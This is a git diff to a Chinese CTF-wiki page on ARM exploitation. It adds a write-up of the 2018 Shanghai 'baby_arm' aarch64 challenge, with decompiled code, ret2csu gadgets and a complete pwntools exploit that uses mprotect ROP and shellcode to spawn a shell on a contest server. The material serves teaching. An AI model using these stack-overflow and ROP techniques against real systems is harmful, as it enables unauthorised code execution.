@@ -10,8 +10,8 @@
 
 除此之外，arm 的 **b/bl** 等指令实现跳转; **pc** 寄存器相当于 x86 的 eip，保存下一条指令的地址，也是我们要控制的目标
 
-## 例题
-这里以 jarvis-oj 的 typo 一题为例进行展示，题目可以在 [ctf-challenge](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/arm/jarvisOJ_typo) 下载
+## jarvisoj - typo
+这里以 jarvisoj 的 typo 一题为例进行展示，题目可以在 [ctf-challenge](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/arm/jarvisOJ_typo) 下载
 
 ### 确定保护
 ```bash
@@ -211,10 +211,167 @@ for i in range(112, 123):
         io.interactive()
 ```
 
+## 2018 上海市大学生网络安全大赛 - baby_arm
+
+### 静态分析
+
+题目给了一个 `aarch64` 架构的文件，没有开 canary 保护
+```bash
+Shanghai2018_baby_arm [master] check ./pwn
++ file ./pwn
+./pwn: ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, for GNU/Linux 3.7.0, BuildID[sha1]=e988eaee79fd41139699d813eac0c375dbddba43, stripped
++ checksec ./pwn
+[*] '/home/m4x/pwn_repo/Shanghai2018_baby_arm/pwn'
+    Arch:     aarch64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
+看一下程序逻辑
+```C
+__int64 main_logic()
+{
+  Init();
+  write(1LL, "Name:", 5LL);
+  read(0LL, input, 512LL);
+  sub_4007F0();
+  return 0LL;
+}
+
+void sub_4007F0()
+{
+  __int64 v0; // [xsp+10h] [xbp+10h]
+
+  read(0LL, &v0, 512LL);
+}
+```
+程序的主干读取了 512 个字符到一个全局变量上，而在 `sub_4007F0()` 中，又读取了 512 个字节到栈上，需要注意的是这里直接从 `frame pointer + 0x10` 开始读取，因此即使开了 canary 保护也无所谓。
+
+### 思路
+理一下思路，可以直接 rop，但我们不知道远程的 libc 版本，同时也发现程序中有调用 `mprotect` 的代码段
+```assembly
+.text:00000000004007C8                 STP             X29, X30, [SP,#-0x10]!
+.text:00000000004007CC                 MOV             X29, SP
+.text:00000000004007D0                 MOV             W2, #0
+.text:00000000004007D4                 MOV             X1, #0x1000
+.text:00000000004007D8                 MOV             X0, #0x1000
+.text:00000000004007DC                 MOVK            X0, #0x41,LSL#16
+.text:00000000004007E0                 BL              .mprotect
+.text:00000000004007E4                 NOP
+.text:00000000004007E8                 LDP             X29, X30, [SP],#0x10
+.text:00000000004007EC                 RET
+```
+但这段代码把 `mprotect` 的权限位设成了 0，没有可执行权限，这就需要我们通过 rop 控制 `mprotect` 设置如 bss 段等的权限为可写可执行
+
+因此可以有如下思路：
+
+1. 第一次输入 name 时，在 bss 段写上 shellcode
+2. 通过 rop 调用 mprotect 改变 bss 的权限
+3. 返回到 bss 上的 shellcode
+
+`mprotect` 需要控制三个参数，可以考虑使用 [ret2csu](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium_rop/#ret2csu) 这种方法，可以找到如下的 gadgets 来控制 `x0, x1, x2` 寄存器
+```assembly
+.text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3]
+.text:00000000004008B0                 MOV             X2, X22
+.text:00000000004008B4                 MOV             X1, X23
+.text:00000000004008B8                 MOV             W0, W24
+.text:00000000004008BC                 ADD             X19, X19, #1
+.text:00000000004008C0                 BLR             X3
+.text:00000000004008C4                 CMP             X19, X20
+.text:00000000004008C8                 B.NE            loc_4008AC
+.text:00000000004008CC
+.text:00000000004008CC loc_4008CC                              ; CODE XREF: sub_400868+3C↑j
+.text:00000000004008CC                 LDP             X19, X20, [SP,#var_s10]
+.text:00000000004008D0                 LDP             X21, X22, [SP,#var_s20]
+.text:00000000004008D4                 LDP             X23, X24, [SP,#var_s30]
+.text:00000000004008D8                 LDP             X29, X30, [SP+var_s0],#0x40
+.text:00000000004008DC                 RET
+```
+
+最终的 [exp](https://github.com/bash-c/pwn_repo/blob/master/Shanghai2018_baby_arm/solve.py) 如下：
+```python
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+from pwn import *
+import sys
+context.binary = "./pwn"
+context.log_level = "debug"
+
+if sys.argv[1] == "l":
+    io = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", "./pwn"])
+elif sys.argv[1] == "d":
+    io = process(["qemu-aarch64", "-g", "1234", "-L", "/usr/aarch64-linux-gnu", "./pwn"])
+else:
+    io = remote("106.75.126.171", 33865)
+
+def csu_rop(call, x0, x1, x2):
+    payload = flat(0x4008CC, '00000000', 0x4008ac, 0, 1, call)
+    payload += flat(x2, x1, x0)
+    payload += '22222222'
+    return payload
+
+
+if __name__ == "__main__":
+    elf = ELF("./pwn", checksec = False)
+    padding = asm('mov x0, x0')
+
+    sc = asm(shellcraft.execve("/bin/sh"))
+    #  print disasm(padding * 0x10 + sc)
+    io.sendafter("Name:", padding * 0x10 + sc)
+    sleep(0.01)
+
+    #  io.send(cyclic(length = 500, n = 8))
+    #  rop = flat()
+    payload = flat(cyclic(72), csu_rop(elf.got['read'], 0, elf.got['__gmon_start__'], 8))
+    payload += flat(0x400824)
+    io.send(payload)
+    sleep(0.01)
+    io.send(flat(elf.plt['mprotect']))
+    sleep(0.01)
+
+    raw_input("DEBUG: ")
+    io.sendafter("Name:", padding * 0x10 + sc)
+    sleep(0.01)
+
+    payload = flat(cyclic(72), csu_rop(elf.got['__gmon_start__'], 0x411000, 0x1000, 7))
+    payload += flat(0x411068)
+    sleep(0.01)
+    io.send(payload)
+
+    io.interactive()
+```
+
+### notice
+同时需要注意的是，`checksec` 检测的结果是开了 nx 保护，但这样检测的结果不一定准确，因为程序的 nx 保护也可以通过 qemu 启动时的参数 `-nx` 来决定（比如这道题目就可以通过远程失败时的报错发现程序开了 nx 保护），老版的 qemu 可能没有这个参数。
+```bash
+Desktop ./qemu-aarch64 --version
+qemu-aarch64 version 2.7.0, Copyright (c) 2003-2016 Fabrice Bellard and the QEMU Project developers
+Desktop ./qemu-aarch64 -h| grep nx
+-nx           QEMU_NX           enable NX implementation
+```
+
+如果有如下的报错，说明没有 aarch64 的汇编器
+```bash
+[ERROR] Could not find 'as' installed for ContextType(arch = 'aarch64', binary = ELF('/home/m4x/Projects/ctf-challenges/pwn/arm/Shanghai2018_baby_arm/pwn'), bits = 64, endian = 'little', log_level = 10)
+    Try installing binutils for this architecture:
+    https://docs.pwntools.com/en/stable/install/binutils.html
+```
+可以参考官方文档的解决方案
+```bash
+Shanghai2018_baby_arm [master●] apt search binutils| grep aarch64
+p   binutils-aarch64-linux-gnu                                         - GNU binary utilities, for aarch64-linux-gnu target
+p   binutils-aarch64-linux-gnu:i386                                    - GNU binary utilities, for aarch64-linux-gnu target
+p   binutils-aarch64-linux-gnu-dbg                                     - GNU binary utilities, for aarch64-linux-gnu target (debug symbols)
+p   binutils-aarch64-linux-gnu-dbg:i386                                - GNU binary utilities, for aarch64-linux-gnu target (debug symbols)
+Shanghai2018_baby_arm [master●] sudo apt install bintuils-aarch64-linux-gnu
+```
+> aarch64 的文件在装 libc 时是 `arm64`，在装 `binutils` 时是 `aarch64`
+
 ## 例题
 Codegate2015 - melong
 
 ## 参考文献
-http://m4x.fun/post/arm_pwn/
 
 http://www.freebuf.com/articles/terminal/134980.html
